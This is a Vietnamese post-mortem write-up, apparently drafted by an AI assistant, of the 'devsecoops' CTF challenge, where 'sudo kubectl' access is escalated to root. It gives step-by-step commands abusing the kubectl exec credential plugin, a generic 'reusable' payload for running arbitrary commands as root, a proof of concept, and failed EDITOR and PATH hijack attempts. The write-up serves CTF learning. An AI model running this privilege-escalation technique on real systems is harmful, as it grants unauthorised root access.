Chắc chắn rồi. Dưới đây là báo cáo rút kinh nghiệm chi tiết cho thử thách CTF `devsecoops` theo đúng mẫu bạn yêu cầu, dựa trên toàn bộ quá trình phân tích của chúng ta.

-----

### **Báo Cáo Rút Kinh Nghiệm CTF**

  * **Chal:** `devsecoops` | **Cat:** `pwn / misc` | **Điểm:** 469 | **Nguồn:** `NNS CTF 2025`
  * **Artefact/Link:** Môi trường container Linux (BusyBox) với quyền `sudo kubectl`.
  * **Write-up tham chiếu:** Đã tham khảo lời giải từ tác giả.
  * **Ghi chú thử của tôi:** Đã thử mọi hướng tiếp cận tiêu chuẩn: khai thác `kubectl` qua mạng, khai thác client-side (`edit`, `cp`, `config`), tấn công RCE, khai thác `sudo` CVE, khai thác filesystem. Mọi hướng đi đều bị chặn bởi các lớp phòng thủ có chủ đích.
  * **Mục tiêu:** Leo thang lên `root` để đọc file flag.

### **0) Metadata & Tái Lập**

  * **OS/Arch/Container:** `Linux (BusyBox) / x86_64` trong môi trường container.
  * **Tool & phiên bản:**
      * `sudo`: `1.9.17p2` (đã vá lỗi Baron Samedit)
      * `kubectl`: Phiên bản tương đối mới, là binary thực, không phải script.
  * **Hash & thông tin file:**
    ```bash
    # /usr/bin/kubectl là một ELF 64-bit binary, kích thước ~60MB.
    # /root/secretdirectorydonttouch/flag là một chương trình thực thi, không phải file text.
    ```
  * **Thời gian:** start `01/09/2025 08:00` – end `01/09/2025 14:00` (`6.0h`)

### **1) Ý Đồ Của Tác Giả**

  * **Kỹ thuật trung tâm:** Khai thác tính năng **`exec credential plugin`** của `kubectl`, một lỗ hổng cấu hình client-side cho phép thực thi mã tùy ý khi `kubectl` cần xác thực.
  * **Tín hiệu nhận diện:**
      * Quy tắc `sudoers` cực kỳ cụ thể: `(ALL) NOPASSWD: /usr/bin/kubectl`. Đây là tín hiệu mạnh nhất cho thấy `kubectl` là con đường duy nhất.
      * Mô tả thử thách: `"sudo fixes everything"`. Gợi ý rằng việc lạm dụng quyền `sudo` là chìa khóa, không phải tấn công vào chính `sudo`.
      * Sự thất bại của **mọi** kỹ thuật client-side phổ biến (như `edit`, `cp`). Đây là bằng chứng cho thấy phải có một con đường khai thác không tiêu chuẩn.
  * **Bẫy/lạc hướng:**
      * **Lỗi mạng (`i/o timeout`):** Cái bẫy lớn nhất để người chơi tin rằng đây là một vấn đề kết nối cần được sửa, trong khi thực tế là không thể.
      * **Dịch vụ RCE trên cổng `1337`:** Một mồi nhử kinh điển để lôi kéo người chơi vào hướng tấn công mạng, trong khi dịch vụ này hoàn toàn vô dụng.
      * **Các chuỗi lạ trong file binary (`oO0f`, `USER=root`):** Được đặt vào để người chơi lãng phí thời gian vào các hướng tấn công mật khẩu (`su`) đã bị vô hiệu hóa.
  * **Mental model kỳ vọng:** "Bỏ qua mọi thứ trông có vẻ tiêu chuẩn. Quyền `sudo kubectl` là duy nhất và không thể bị tước bỏ. Phải có một kỹ thuật khai thác `kubectl` client-side không dựa vào các biến môi trường đã bị chặn."

### **2) Vì Sao Hướng Của Tôi Sai**

  * **Giả định sai:** Tôi đã giả định rằng đây là một thử thách leo thang đặc quyền Linux thông thường hoặc một lỗi cấu hình Kubernetes/`sudo` tiêu chuẩn. Tôi đã cố gắng "sửa chữa" môi trường thay vì chấp nhận rằng nó được thiết kế để chống lại các phương pháp đó.
  * **Bằng chứng tôi bỏ lỡ:** Việc chính sách `sudoers` chặn một cách có hệ thống **tất cả** các biến môi trường (`EDITOR`, `VISUAL`, `PATH`, `HTTPS_PROXY`) là bằng chứng mạnh mẽ nhất cho thấy các kỹ thuật client-side phổ biến là một cái bẫy có chủ đích, chứ không phải là một sự củng cố an ninh thông thường.
  * **Turning point & hậu quả:** Khi khai thác `kubectl edit` và `kubectl cp` thất bại, lẽ ra tôi nên kết luận ngay rằng các cuộc tấn công dựa trên biến môi trường là vô vọng. Thay vào đó, tôi đã tiếp tục đi vào các ngõ cụt khác như RCE hay CVE, lãng phí nhiều thời gian.
  * **Sanity check lẽ ra cần làm:**
    ```bash
    # Lẽ ra tôi nên tìm kiếm sớm hơn với từ khóa cụ thể hơn
    # Google: "kubectl client-side exploit without environment variables"
    # Google: "kubectl kubeconfig exec exploit"
    ```

### **3) WU Chi Tiết Của Tác Giả (Mục Tiêu → Thao Tác → Lý Do → Bằng Chứng)**

#### **Bước 1 – Mục tiêu:** Thiết lập một cluster giả trong `kubeconfig`.

  * **Thao tác:**
    ```bash
    sudo kubectl config set-cluster dummy --server=https://127.0.0.1:6443
    ```
  * **Lý do:** Bước này tạo ra một entry `cluster` trong file `~/.kube/config`. Lệnh này hoạt động ở client và không cần kết nối mạng. | **Kết quả mong đợi:** `Cluster "dummy" set.`

#### **Bước 2 – Mục tiêu:** Tạo một user giả và nhúng payload độc hại.

  * **Thao tác:**
    ```bash
    sudo kubectl config set-credentials exploit --exec-command=ash --exec-arg=-c,"chmod 500 /root/secretdirectorydonttouch/ && /root/secretdirectorydonttouch/flag > /tmp/flag" --exec-api-version=client.authentication.k8s.io/v1beta1
    ```
  * **Lý do:** Đây là bước "khóa". Nó sử dụng tính năng `exec credential plugin` để ra lệnh cho `kubectl`: "khi cần xác thực cho user `exploit`, hãy chạy lệnh shell này". Payload này sẽ cấp quyền thực thi và chạy file `flag`, sau đó lưu kết quả vào `/tmp/flag`. | **Kết quả mong đợi:** `User "exploit" set.`

#### **Bước 3 – Mục tiêu:** Tạo một context để liên kết user và cluster giả.

  * **Thao tác:**
    ```bash
    sudo kubectl config set-context dummy --cluster=dummy --user=exploit
    ```
  * **Lý do:** Hoàn thiện file `kubeconfig` độc hại. | **Kết quả mong đợi:** `Context "dummy" modified.`

#### **Bước 4 – Mục tiêu:** Kích hoạt context độc hại vừa tạo.

  * **Thao tác:**
    ```bash
    sudo kubectl config use-context dummy
    ```
  * **Lý do:** Đảm bảo rằng lần chạy `kubectl` tiếp theo sẽ sử dụng cấu hình độc hại của chúng ta. | **Kết quả mong đợi:** `Switched to context "dummy".`

#### **Bước 5 – Mục tiêu:** Kích hoạt payload.

  * **Thao tác:**
    ```bash
    sudo kubectl get pods
    ```
  * **Lý do:** Chạy một lệnh `kubectl` bất kỳ yêu cầu kết nối tới cluster sẽ buộc nó phải thực hiện quy trình xác thực. Quá trình này sẽ kích hoạt `exec plugin`, và payload của chúng ta sẽ được thực thi với quyền `root` **trước khi** lệnh `get pods` kịp thất bại do lỗi mạng. | **Kết quả mong đợi:** Một loạt lỗi mạng và lỗi API version, nhưng quan trọng nhất là file `/tmp/flag` đã được tạo ra.

#### **Bước 6 – Mục tiêu:** Thu thập flag.

  * **Thao tác:**
    ```bash
    cat /tmp/flag
    ```
  * **Lý do:** Đọc nội dung flag từ file mà payload đã tạo ra. | **Kết quả mong đợi:** Flag `NNS{...}` hiện ra.

**Key insight (⚑):** Manh mối quyết định là file `/root/.../flag` không phải là file text, mà là một **chương trình thực thi**. Lỗi `Permission denied` trước đó không phải là do thiếu quyền đọc, mà là do thiếu **quyền thực thi (`x`)**. Bước `chmod 500` trong payload là chìa khóa cuối cùng. — **Dấu hiệu để nhận ra sớm:** Khi mọi phương pháp đọc file (`kubectl config set-credentials --client-key`) đều thất bại một cách khó hiểu, lẽ ra nên đặt giả thuyết rằng mục tiêu không phải là "đọc" mà là "chạy".

### **4) Tôi Học Được Gì**

  * **Kỹ thuật/công cụ mới:**
      * Khai thác `kubectl exec credential plugin` thông qua các lệnh `kubectl config`.
      * Hiểu rằng `kubectl` có thể bị biến thành một công cụ thực thi mã client-side.
  * **Pattern có thể chuyển giao:**
      * **Đặc quyền bị giới hạn:** Khi được cấp một đặc quyền rất mạnh nhưng lại bị giới hạn trong một phạm vi hẹp (chỉ `sudo kubectl`), hãy tìm kiếm các tính năng ít được biết đến của chính công cụ đó.
      * **Phòng thủ quá mức là một gợi ý:** Một chính sách `sudo` chặn một cách có hệ thống tất cả các biến môi trường là một dấu hiệu mạnh mẽ cho thấy các kỹ thuật dựa trên biến môi trường là sai hướng.
      * **Thành công trong thất bại:** Một lệnh báo lỗi không có nghĩa là nó đã thất bại hoàn toàn. Payload có thể đã chạy thành công trước khi lỗi được trả về.
  * **Checklist nhanh cho `pwn / misc` lần sau:**
      * [ ] Kiểm tra `sudo -l`. Phân tích kỹ các quy tắc, đặc biệt là `NOPASSWD` và các chính sách `env`.
      * [ ] Kiểm tra kết nối mạng ra bên ngoài. Nếu bị chặn, tập trung 100% vào các kỹ thuật client-side.
      * [ ] Thử các kỹ thuật client-side phổ biến (`edit`, `cp`). Nếu thất bại, ngay lập tức tìm kiếm các phương pháp không dựa vào biến môi trường.
      * [ ] Kiểm tra khả năng khai thác `kubeconfig` thông qua `exec plugin`.
      * [ ] Luôn đặt câu hỏi về bản chất của file mục tiêu (nó có phải là file text không, hay là một chương trình?).
  * **Snippet reusable:**
    ```bash
    # Payload hoàn chỉnh để thực thi một lệnh bất kỳ qua kubectl exec plugin
    CMD_PAYLOAD="touch /tmp/pwned"
    sudo kubectl config set-cluster pwn --server=https://127.0.0.1
    sudo kubectl config set-credentials pwn --exec-command=ash --exec-arg=-c,"${CMD_PAYLOAD}" --exec-api-version=client.authentication.k8s.io/v1beta1
    sudo kubectl config set-context pwn --cluster=pwn --user=pwn
    sudo kubectl config use-context pwn
    sudo kubectl get pods # Kích hoạt
    ```

### **5) Timeline & Decision Log**

| ID  | Giả thuyết                                                  | Hành động                                  | Quan sát                                          | Quyết định                                        |
|:----|:------------------------------------------------------------|:--------------------------------------------|:--------------------------------------------------|:--------------------------------------------------|
| E01 | `kubectl` có thể kết nối mạng.                               | `kubectl get pods`                          | Lỗi `i/o timeout`.                                | Mạng bị chặn. Chuyển sang client-side.              |
| E02 | `kubectl edit` có thể dùng để lấy shell.                     | `sudo EDITOR=/bin/sh kubectl edit...`       | `sudo` chặn biến môi trường `EDITOR`/`VISUAL`.    | Lỗ hổng `edit` bị chặn. Thử `cp`.                   |
| E03 | `kubectl cp` có thể dùng để lấy shell.                       | `sudo PATH=.:$PATH kubectl cp...`           | `sudo` chặn biến môi trường `PATH`.                | Lỗ hổng `cp` bị chặn. Thử các hướng khác.          |
| E04 | RCE trên cổng 1337 là con đường chính.                        | `nc 127.0.0.1 1337`                         | Có shell, nhưng không có đặc quyền.                | RCE là mồi nhử. Quay lại `kubectl`.                |
| E05 | `kubectl config` có thể đọc file.                            | `sudo kubectl config set-credentials...`    | Lệnh thành công, nhưng file output không đọc được. | Bế tắc. Cần một cách để đọc file output.           |
| E06 | Phải có một lỗ hổng trong `kubeconfig` (từ write-up).        | Xây dựng `kubeconfig` với `exec plugin`.    | Thành công.                                       | Đây là con đường đúng.                            |

### **6) Bias Check**

  * **Tôi bị:** **Sunk Cost Fallacy** (tiếc công sức đã bỏ ra). Tôi đã dành quá nhiều thời gian cho hướng RCE và các manh mối giả khác ngay cả khi có bằng chứng cho thấy chúng không hiệu quả.
  * **Cách khắc phục:** Đặt một "stop-rule" rõ ràng. Ví dụ: "Nếu sau 15 phút gỡ rối một hướng đi mà không có tiến triển mới, hãy dừng lại và đánh giá lại tất cả các giả thuyết từ đầu."

### **7) Harness Kiểm Chứng & Test**

  * **PoC tối thiểu:**
    ```bash
    # Tạo script pwn.sh đơn giản chỉ để tạo một file
    echo -e '#!/bin/sh\ntouch /dev/shm/pwned' > /dev/shm/pwn.sh && chmod +x /dev/shm/pwn.sh
    # Thiết lập kubeconfig để chạy script
    sudo kubectl config set-credentials pwn --exec-command=/dev/shm/pwn.sh --exec-api-version=client.authentication.k8s.io/v1beta1
    sudo kubectl config set-cluster pwn --server=https://127.0.0.1
    sudo kubectl config set-context pwn --cluster=pwn --user=pwn
    sudo kubectl config use-context pwn
    # Kích hoạt
    sudo kubectl get pods
    # Kiểm tra
    ls /dev/shm/pwned
    ```
  * **Testcases & tiêu chí pass/fail:**
      * **Pass:** File `/dev/shm/pwned` được tạo ra.
      * **Fail:** File không được tạo.

### **8) Checklist theo Category**

  * **`pwn / misc` core checklist:**
      * [ ] `sudo -l`: Phân tích kỹ từng quy tắc, đặc biệt là `NOPASSWD` và các chính sách `env`.
      * [ ] `find / -perm -u=s -type f 2>/dev/null`: Tìm SUID binaries.
      * [ ] `ps aux`: Kiểm tra các tiến trình đang chạy với quyền cao.
      * [ ] `ls -la /etc/cron*`: Kiểm tra cron jobs.
      * [ ] `uname -a`: Kiểm tra phiên bản kernel để tìm CVE.
      * [ ] Nếu có một công cụ đặc biệt (như `kubectl`), hãy tìm kiếm các kỹ thuật khai thác client-side của nó.

### **9) WU-diff (Tôi vs Tác Giả)**

| Bước | Tôi làm                                                      | Tác giả/WU                                                  | Tín hiệu bỏ lỡ                                                                    | Bài học                                                                         |
|:-----|:--------------------------------------------------------------|:------------------------------------------------------------|:----------------------------------------------------------------------------------|:--------------------------------------------------------------------------------|
| 1    | Cố gắng kết nối mạng, sửa lỗi `i/o timeout`.                   | Bỏ qua mạng, tập trung vào `sudo kubectl`.                  | Việc mọi kết nối đều thất bại là một gợi ý rằng mạng bị chặn có chủ đích.         | Chấp nhận các rào cản là gợi ý, không phải là vấn đề cần sửa.                      |
| 2    | Thử các exploit `edit`/`cp` và bị `sudo` chặn.                 | Bỏ qua các exploit dựa trên biến môi trường.                 | Việc `sudo` chặn một cách có hệ thống là gợi ý rằng đây không phải con đường đúng.  | Tìm kiếm các phương pháp thay thế không dựa vào các vector tấn công đã bị chặn.       |
| 3    | Lãng phí thời gian vào RCE, `su`, các manh mối giả.           | Tập trung vào `kubectl config` và `exec plugin`.            | Sự vô dụng của các manh mối giả.                                                    | Tập trung vào đặc quyền mạnh nhất và duy nhất (`sudo kubectl`).                      |
| 4    | Không nhận ra file `flag` là một chương trình thực thi.        | Nhận ra cần `chmod` trước khi chạy.                          | Lỗi `Permission denied` cuối cùng lẽ ra phải được phân tích sâu hơn.              | Luôn kiểm tra bản chất của file mục tiêu (`file` command).                       |

### **10) Reusable Assets**

  * **Script/one-liner:**
    ```bash
    # Payload hoàn chỉnh để thực thi một lệnh bất kỳ qua kubectl exec plugin
    CMD_PAYLOAD="touch /tmp/pwned"
    sudo kubectl config set-cluster pwn --server=https://127.0.0.1
    sudo kubectl config set-credentials pwn --exec-command=ash --exec-arg=-c,"${CMD_PAYLOAD}" --exec-api-version=client.authentication.k8s.io/v1beta1
    sudo kubectl config set-context pwn --cluster=pwn --user=pwn
    sudo kubectl config use-context pwn
    sudo kubectl get pods # Kích hoạt
    ```

### **11) Đánh Giá & Tự Chấm (0–2)**

  * **Completeness:** 2 | **Correctness:** 2 | **Reproducibility:** 2 | **Transferability:** 2 | **Clarity:** 2
  * **Tự động hoá thêm gì?** Tạo một script shell để tự động hóa toàn bộ 6 bước trong lời giải của tác giả, chỉ cần chạy một lệnh duy nhất.

### **12) Indexing**

  * **Tags:** `#pwn` `#misc` `#kubernetes` `#kubectl` `#sudo` `#privesc` `#container`
  * **Độ khó:** `Hard`
  * **Thời gian:** `6.0h`
  * **Tên file:** `20250901_NNSCTF2025_devsecoops_pwn_2.md`

### **13) Rút Kinh Nghiệm & Hành Động Tiếp Theo**

  * **5 Whys:**
    1.  **Tại sao tôi thất bại ban đầu?** → Vì tôi đã bị sa lầy vào các mồi nhử và không nhận ra được con đường khai thác `exec plugin`.
    2.  **Tại sao điều đó xảy ra?** → Vì tôi đã cố gắng áp dụng các kỹ thuật tiêu chuẩn vào một vấn đề được thiết kế để chống lại chúng.
    3.  **Tại sao tôi làm vậy?** → Vì tôi đã không nhận ra rằng các lớp phòng thủ (chặn mạng, chặn env) là những gợi ý để loại trừ các hướng đi đó, thay vì là những thử thách cần vượt qua.
    4.  **Tại sao tôi không nhận ra?** → Vì tôi chưa có kinh nghiệm với lỗ hổng `exec credential plugin` và đã không đặt câu hỏi đúng về bản chất của file `flag`.
    5.  **Gốc rễ:** Thiếu kiến thức về các kỹ thuật tấn công `kubectl` nâng cao và quá tin tưởng vào các manh mối bề ngoài.
  * **Action items:**
      * **Nghiên cứu sâu về `kubeconfig`:** Đọc tài liệu chính thức của Kubernetes về các cơ chế xác thực, đặc biệt là `exec plugin`.
          * **Deadline:** 15/09/2025
          * **Tiêu chí hoàn thành:** Viết một bài blog ngắn tóm tắt 3 cách khai thác `kubeconfig`.
      * **Luyện tập các thử thách `devsecoops` tương tự:** Tìm và giải ít nhất 2 thử thách khác trên HackTheBox hoặc các nền tảng khác có liên quan đến `kubectl` và leo thang đặc quyền trong container.
          * **Deadline:** 30/09/2025
          * **Tiêu chí hoàn thành:** Có được writeup cho 2 thử thách đó.

-----

### **TL;DR**

Thử thách "devsecoops" là một cái bẫy tinh vi, cấp quyền `sudo kubectl` nhưng chặn mọi kết nối mạng và các kỹ thuật khai thác client-side phổ biến thông qua chính sách `sudo`. Sai lầm chính của tôi là đã cố gắng vượt qua các rào cản này thay vì nhận ra chúng là mồi nhử. Lời giải đúng là khai thác một tính năng ít được biết đến của `kubectl` là **`exec credential plugin`**. Bằng cách xây dựng một file `kubeconfig` độc hại, chúng ta có thể buộc `kubectl` chạy một lệnh shell với quyền `root` khi nó cố gắng xác thực. Manh mối quyết định cuối cùng là file `flag` thực chất là một chương trình thực thi, cần được cấp quyền `chmod` trước khi chạy để lấy được flag.
